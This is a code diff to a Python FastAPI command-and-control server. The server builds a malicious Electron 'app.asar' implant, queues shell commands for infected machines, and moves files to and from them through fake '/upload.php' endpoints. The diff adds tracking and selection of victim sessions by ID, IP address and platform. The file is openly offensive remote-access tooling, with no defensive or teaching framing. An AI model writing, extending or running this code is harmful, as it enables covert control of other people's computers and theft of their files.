@@ -9,12 +9,39 @@ import threading
 import uvicorn
 from asargen import createAsarFile
 
+
+class SESSION:
+    def __init__(self):
+        self.data = {
+            'ID': None,
+            'Address': None,
+            'Platform': None
+        }
+
+    def set_info(self, ID=None, Address=None, Platform=None):
+        if ID:
+            self.data['ID'] = ID
+        if Address:
+            self.data['Address'] = Address
+        if Platform:
+            self.data['Platform'] = Platform
+    
+    def get_info(self, field):
+        return self.data.get(field, "Field not found")
+
+    def display(self):
+        return self.data
+ 
 ADDRESS: str = "127.0.0.1"
 PORT: int = 1337
 CMD_HISTORY: List[str] = []
 HISTORY_INDEX: int = -1
 CMD_QUEUE: List[str] = []
 PAUSE_CMDS: bool = False
+
+SESSIONS: List[SESSION] = []
+
+CURRENT_SESSION: str = "none"
 
 app = FastAPI()
 
@@ -84,11 +111,15 @@ def handle_down_arrow():
         HISTORY_INDEX += 1
         readline.set_startup_hook(lambda: readline.insert_text(CMD_HISTORY[HISTORY_INDEX]))
         readline.redisplay()
-    
+ 
 def checkIfNewClient(client, sessionID, platform):
     if (client not in clients) and (global_lock == False):
         clients.append(client)
-        print(f"\nNew session: {sessionID} - IP: {client}, Platform: {platform}\n")
+        print(f"\n{bcolors.OKGREEN}[!]{bcolors.ENDC} New session: {sessionID}\n")
+        session = SESSION()
+        session.set_info(ID=sessionID, Address=client, Platform=platform)
+        SESSIONS.append(session)
+        
         global global_connection
         global_connection = True
 
@@ -102,9 +133,11 @@ def getIP(request: Request) -> str:
 
 @app.get("/upload.php/{file:path}", response_class=PlainTextResponse)
 async def upload_file(file: str, request: Request):
-    print("get upload")
-    data = encodeFile(file)
-    return data
+    client = getIP(request)
+    if client == CURRENT_SESSION:
+        print("get upload")
+        data = encodeFile(file)
+        return data
 
 @app.get("/cookie_id={sessioninfo:path}", response_class=PlainTextResponse)
 async def session_initiate(sessioninfo: str, request: Request):
@@ -116,16 +149,18 @@ async def session_initiate(sessioninfo: str, request: Request):
 
 @app.post("/upload.php/{file:path}")
 async def download_file(file: str, request: Request):
-    data: dict = await request.json()
-    #print(file, data["result"])
-    decodeFile(file, data["result"])
+    client = getIP(request)
+    if client == CURRENT_SESSION:
+        data: dict = await request.json()
+        #print(file, data["result"])
+        decodeFile(file, data["result"])
 
 @app.get("/{path:path}", response_class=PlainTextResponse)
 async def get_command(path: str, request: Request):
 
     client = getIP(request)
 
-    if path in cmdRequests: 
+    if path in cmdRequests and client == CURRENT_SESSION: 
         if len(CMD_QUEUE) == 0:
             return "204 - No Content"
         cmd: str = CMD_QUEUE.pop(0)
@@ -135,7 +170,9 @@ async def get_command(path: str, request: Request):
 
 @app.post("/{path:path}")
 async def send_output(path: str, request: Request):
-    if path in outputRequests:
+    client = getIP(request)
+
+    if path in outputRequests and client == CURRENT_SESSION:
         data: dict = await request.json()
         if "Session:" in data["result"]:
             sessionid = data["result"].lstrip("Session:")
@@ -198,6 +235,29 @@ def generateAsar():
     createAsarFile(asarFile, ADDRESS, PORT)
     print("Successfully created implant \"Output/app.asar!\"")
 
+def listSessions():
+    print(f"\n{len(SESSIONS)} Active Session(s):")
+    for i, session in enumerate(SESSIONS):
+        print(f"\n{i} - [{bcolors.OKGREEN}ACTIVE{bcolors.ENDC}]") 
+        print(f"\tSession ID: {session.get_info('ID')}")
+        print(f"\tIP Address: {session.get_info('Address')}")
+        print(f"\tPlatform: {session.get_info('Platform')}")
+        print("\n")
+
+def selectSession(choice):
+    global CURRENT_SESSION
+    # select session
+    while CURRENT_SESSION == "none":
+        sessionChoice = choice
+        for i, session in enumerate(SESSIONS):
+            if sessionChoice == session.get_info('ID') or (sessionChoice.isdigit() and int(sessionChoice) == i):
+                CURRENT_SESSION = session.get_info('Address')
+                print(f"Selected session: {session.get_info('ID')}")
+                break
+            else:
+                sessionChoice = ""
+                print("Please select a valid session.")
+
 def input_thread():
     printHeader()
     portSet = False
@@ -239,13 +299,72 @@ def input_thread():
 
     while True:
         new_cmd = ""
+        selection = ""
 
         keyboard.on_press_key("up", lambda _: handle_up_arrow())
         keyboard.on_press_key("down", lambda _: handle_down_arrow())
 
         #keyboard.on_press_key("up", print("up"))
 
-        if global_connection:
+        global CURRENT_SESSION
+        """
+        while global_CURRENT_SESSION == "none":
+            print("\nSessions:")
+            
+            sessionChoice = input("\nPlease select a session: ")
+            if sessionChoice in SESSIONS:
+                CURRENT_SESSION = sessionChoice
+                print(f"Using session {CURRENT_SESSION}.")
+                break
+            elif int(sessionChoice) < len(SESSIONS):
+                CURRENT_SESSION = SESSIONS[int(sessionChoice)]
+                print(f"Using session {CURRENT_SESSION}.")
+                break
+            else:
+                print("Please specify a valid session.")
+        """            
+        """
+        while len(SESSIONS) == 0:
+            if len(SESSIONS) > 0:
+                break
+        """
+        
+
+        while selection == "":
+            selection = input("$ ")
+            if selection.strip() == "sessions":
+                # list sessions
+                if CURRENT_SESSION == "none" and len(SESSIONS) != 0:
+                    listSessions()
+                    selection = ""
+                else:
+                    print("There are currently no active sessions.")
+            elif selection.split(' ')[0] == "use":
+                choice = selection.split(' ')[1]
+                selectSession(choice)
+                break
+            elif selection == "help":
+                print(f"""
+    - use \"sessions\" to list current sessions.
+    - use \"use\" to select a session (either by session number or session ID).
+    - use \"help\" to view this help message.
+    - use \"exit\" to exit.
+                      """)
+                selection = ""
+            elif selection == "exit":
+                print("Exitting...")
+                # You're welcome :)
+                os.system(f"kill {os.getpid()}")
+                while True: pass
+            else:
+                print("Please enter a valid command.")
+                selection = ""
+
+        
+
+        
+    
+        if global_connection and CURRENT_SESSION != "none":
             new_cmd = input("$ ").lower()
         #help
         if new_cmd == "help":
